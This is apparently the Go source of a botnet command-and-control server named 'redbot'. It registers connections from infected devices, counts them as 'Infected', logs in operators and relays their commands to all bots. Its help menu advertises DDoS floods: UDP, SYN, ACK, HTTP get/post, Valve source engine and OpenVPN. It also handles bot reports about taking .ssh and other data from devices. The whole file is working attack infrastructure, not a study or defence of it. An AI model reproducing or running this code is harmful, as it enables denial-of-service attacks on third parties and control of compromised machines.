package main

import (
	"bufio"
	"crypto/aes"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
	"unsafe"
)

type bot struct {
	arch string
	conn net.Conn
}

type client struct {
	conn           net.Conn
	user           User
	lastBotCommand time.Time
}

const (
	CONN_HOST     = "0.0.0.0"
	CONN_PORT     = "6001"
	CONN_TYPE     = "tcp"
	letterBytes   = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	letterIdxBits = 6                    // 6 bits to represent a letter index
	letterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits
	letterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits
	key           = "093920keisoflLOA"
)

func randomString(n int) string {
	var src = rand.NewSource(time.Now().UnixNano())
	b := make([]byte, n)
	for i, cache, remain := n-1, src.Int63(), letterIdxMax; i >= 0; {
		if remain == 0 {
			cache, remain = src.Int63(), letterIdxMax
		}
		if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
			b[i] = letterBytes[idx]
			i--
		}
		cache >>= letterIdxBits
		remain--
	}

	return *(*string)(unsafe.Pointer(&b))
}

var (
	bots              = []bot{}
	clients           = []*client{}
	mutex             = sync.Mutex{}
	activeConnections = []*net.Conn{}
	connectionsLock   = sync.Mutex{}
)

func getArch() map[string]int {
	botsMap := map[string]int{}
	for _, bot := range bots {
		botsMap[bot.arch]++
	}
	return botsMap
}

func checkBots() {
	for true {
		newBots := []bot{}
		for _, bot := range bots {
			n, err := bot.conn.Write([]byte("!PING\n"))
			if err == nil && n > 4 {
				newBots = append(newBots, bot)
			}
		}
		bots = newBots
		time.Sleep(time.Second * 5)
	}
}

func remove(slice []bot, s int) []bot {
	mutex.Lock()
	defer mutex.Unlock()
	return append(slice[:s], slice[s+1:]...)
}

func updateTitle() {
	for {
		for i, client := range clients {
			consoleTitle := "User ID: " + strconv.Itoa(i) + " | Infected: " + strconv.Itoa(len(bots))
			client.setConsoleTitle(consoleTitle)
		}
		time.Sleep(time.Second * 5)
	}
}

func EncryptAES(key []byte, plaintext string) string {
	// create cipher
	c, err := aes.NewCipher(key)
	if err != nil {
		return ""
	}

	// allocate space for ciphered data
	out := make([]byte, len(plaintext))

	// encrypt
	c.Encrypt(out, []byte(plaintext))
	// return hex string
	return hex.EncodeToString(out)
}

func main() {
	if _, fileError := os.ReadFile("users.json"); fileError != nil {
		rootUser := User{
			Username: "root",
			Password: randomString(12),
			Expire:   time.Now().AddDate(111, 111, 111),
			Level:    Owner,
		}
		bytes, _ := json.Marshal([]User{rootUser})
		os.WriteFile("users.json", bytes, 0777)
		println("Login with username", rootUser.Username, "and password", rootUser.Password)
	}
	// Listen for incoming connections.
	l, err := net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1)
	}
	// Close the listener when the application closes.
	defer l.Close()
	fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)
	go func() {
		for {
			// Listen for an incoming connection.
			conn, err := l.Accept()
			if err != nil {
				fmt.Println("Error accepting: ", err.Error())
				os.Exit(1)
			}
			// Handle connections in a new goroutine
			go handleRequest(conn)
		}
	}()
	go updateTitle()
	go checkBots()
	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Print("Enter text: ")
		text, _ := reader.ReadString('\n')
		if strings.HasPrefix(text, "bots") {
			for arch, count := range getArch() {
				println(strings.ReplaceAll(arch, "\n", "") + ":" + strconv.Itoa(count))
			}
			continue
		} else if strings.HasPrefix(text, "?") {
			fmt.Println([]byte("\033[0;31m--- Attack Vectors ---\n\r"))
			fmt.Println([]byte("\033[0;31m!\033[1;37mudp-large  -   \033[1;30mUDP flood optimized for high Gbit/s\n\r"))
			fmt.Println([]byte("\033[0;31m!\033[1;37mudp-pps    -   \033[1;30mUDP flood optimized for high p/s\n\r"))
			fmt.Println([]byte("\033[0;31m!\033[1;37msyn-large  -   \033[1;30mTCP-SYN flood optimized for high Gbit/s\n\r"))
			fmt.Println([]byte("\033[0;31m!\033[1;37msyn-pps    -   \033[1;30mTCP-SYN flood optimized for high p/s\n\r"))
			fmt.Println([]byte("\033[0;31m!\033[1;37mack-large  -   \033[1;30mTCP-ACK flood optimized for high Gbit/s\n\r"))
			fmt.Println([]byte("\033[0;31m!\033[1;37mack-pps    -   \033[1;30mTCP-ACK flood optimized for high Gbit/s\n\r"))
			fmt.Println([]byte("\033[0;31m!\033[1;37mvse        -   \033[1;30mValve source engine flood high p/s\n\r"))
			fmt.Println([]byte("\033[0;31m!\033[1;37mget/post   -   \033[1;30mHTTP flood via get/post\n\r"))
			fmt.Println([]byte("\033[0;31m!\033[1;37mhandshake  -   \033[1;30mTCP 3-way flood.\n\r"))
			fmt.Println([]byte("\033[0;31m!\033[1;37mopenvpn    -   \033[1;30mCustomized OpenVPN UDP flood\n\r"))
		}
		//text = EncryptAES([]byte(key), text)
		connectionsLock.Lock()
		for _, activeConn := range activeConnections {
			_, err := (*activeConn).Write([]byte(text))
			if err != nil {
				fmt.Println(err.Error())
			}
		}
		connectionsLock.Unlock()
	}
}

func getFromConn(conn net.Conn) (string, error) {
	readString, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		println(err.Error())
		return readString, err
	}
	readString = strings.TrimSuffix(readString, "\n")
	readString = strings.TrimSuffix(readString, "\r")
	return readString, nil
}

func authUser(conn net.Conn) (bool, *client) {
	for i := 0; i < 3; i++ {
		conn.Write([]byte("Username: "))
		username, _ := getFromConn(conn)
		conn.Write([]byte("Password: "))
		password, _ := getFromConn(conn)
		if exists, user := AuthUser(username, password); exists {
			loggedClient := &client{
				conn: conn,
				user: *user,
			}
			clients = append(clients, loggedClient)
			return true, loggedClient
		}
	}
	conn.Close()
	return false, nil
}

// Handles incoming requests.
func handleRequest(conn net.Conn) {
	conn.Write([]byte(getConsoleTitleAnsi("redbot")))
	readString, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		println(err.Error())
		return
	}
	if strings.HasPrefix(readString, "GoBot") {
		for _, bot := range bots { // no duping
			_, err := bot.conn.Write([]byte("!PING"))
			if err != nil {
				println(err.Error())
			} else {
				connectingRemote := strings.Split(conn.RemoteAddr().String(), ":")[0]
				connectedRemote := strings.Split(bot.conn.RemoteAddr().String(), ":")[0]
				if connectingRemote == connectedRemote {
					//conn.Close()
					//return
				}
			}
		}
		botArch := strings.Split(readString, ":")[1]
		bots = append(bots, bot{
			arch: botArch,
			conn: conn,
		})
		connectionsLock.Lock()
		activeConnections = append(activeConnections, &conn)
		connectionsLock.Unlock()
		for true {
			botMessage, err := bufio.NewReader(conn).ReadString('\v')
			if err != nil {
				return
			}
			if strings.HasPrefix(botMessage, "!") {
				botMessage = strings.TrimPrefix(botMessage, "!")
				if strings.Contains(botMessage, "/exe") ||
					strings.Contains(botMessage, ": directory not empty") ||
					strings.Contains(botMessage, ".ssh from the device") ||
					strings.Contains(botMessage, "data from the device") ||
					strings.Contains(botMessage, "usrmode from the device") ||
					strings.Contains(botMessage, ": permission denied") ||
					strings.Contains(botMessage, ": operation not permitted") ||
					strings.Contains(botMessage, "device or resource busy") {
					continue
				}
				botArguments := strings.SplitN(botMessage, " ", 1)
				println(strings.TrimPrefix(botMessage, "LOG"))
				if botArguments[0] == "LOG" && len(botArguments) > 1 {
					println(botArguments[1])
				}
			}
		}
	}
	if strings.HasPrefix(readString, "login") {
		if authed, _ := authUser(conn); authed {
			for {
				conn.Write([]byte("\033[0;31m[\033[1;37mredbot\033[0;31m]\033[1;37m>\033[1;37m "))
				readString, err := bufio.NewReader(conn).ReadString('\n')
				readString = strings.TrimSuffix(readString, "\n")
				readString = strings.TrimSuffix(readString, "\r")
				if err != nil {
					conn.Close()
					return
				}

				if strings.HasPrefix(readString, "bots") {
					for arch, count := range getArch() {
						conn.Write([]byte(strings.ReplaceAll(arch, "\n", "") + ":" + strconv.Itoa(count) + "\n\r"))
					}
					continue
				} else if strings.HasPrefix(readString, "?") {
					conn.Write([]byte("\033[0;31m--- Attack Vectors ---\n\r"))
					conn.Write([]byte("\033[0;31m!\033[1;37mudp-large  -   \033[1;30mUDP flood optimized for high Gbit/s\n\r"))
					conn.Write([]byte("\033[0;31m!\033[1;37mudp-pps    -   \033[1;30mUDP flood optimized for high p/s\n\r"))
					conn.Write([]byte("\033[0;31m!\033[1;37msyn-large  -   \033[1;30mTCP-SYN flood optimized for high Gbit/s\n\r"))
					conn.Write([]byte("\033[0;31m!\033[1;37msyn-pps    -   \033[1;30mTCP-SYN flood optimized for high p/s\n\r"))
					conn.Write([]byte("\033[0;31m!\033[1;37mack-large  -   \033[1;30mTCP-ACK flood optimized for high Gbit/s\n\r"))
					conn.Write([]byte("\033[0;31m!\033[1;37mack-pps    -   \033[1;30mTCP-ACK flood optimized for high Gbit/s\n\r"))
					conn.Write([]byte("\033[0;31m!\033[1;37mvse        -   \033[1;30mValve source engine flood high p/s\n\r"))
					conn.Write([]byte("\033[0;31m!\033[1;37mget/post   -   \033[1;30mHTTP flood via get/post\n\r"))
					conn.Write([]byte("\033[0;31m!\033[1;37mhandshake  -   \033[1;30mTCP 3-way flood.\n\r"))
					conn.Write([]byte("\033[0;31m!\033[1;37mopenvpn    -   \033[1;30mCustomized OpenVPN UDP flood\n\r"))
				}
				newBots := []bot{}
				for _, bot := range bots {
					_, err := bot.conn.Write([]byte(readString + "\n"))
					if err != nil {
						println(err.Error())
					} else {
						newBots = append(newBots, bot)
					}
				}
				bots = newBots
			}
		}
	}
}